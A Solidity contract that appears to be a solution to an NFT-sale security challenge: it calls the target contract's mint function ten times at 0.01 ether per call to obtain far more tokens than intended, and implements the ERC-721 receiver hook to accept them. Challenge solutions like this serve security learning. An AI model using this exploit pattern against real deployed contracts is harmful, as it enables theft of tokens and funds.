// SPDX-License-Identifier:GPL-3.0-or-later
pragma solidity 0.8.10;

// import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {Nft} from "../tokens/NftSaleChallenge.sol";

interface IERC721Receiver {
    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
     *
     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract ExploitNftSaleChallenge is IERC721Receiver {

    function exploit(address _target) external payable {
        Nft nft = Nft(_target);
        nft.mint{ value: 0.01 ether }(10);
        nft.mint{ value: 0.01 ether }(10);
        nft.mint{ value: 0.01 ether }(10);
        nft.mint{ value: 0.01 ether }(10);
        nft.mint{ value: 0.01 ether }(10);
        nft.mint{ value: 0.01 ether }(10);
        nft.mint{ value: 0.01 ether }(10);
        nft.mint{ value: 0.01 ether }(10);
        nft.mint{ value: 0.01 ether }(10);
        nft.mint{ value: 0.01 ether }(10);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
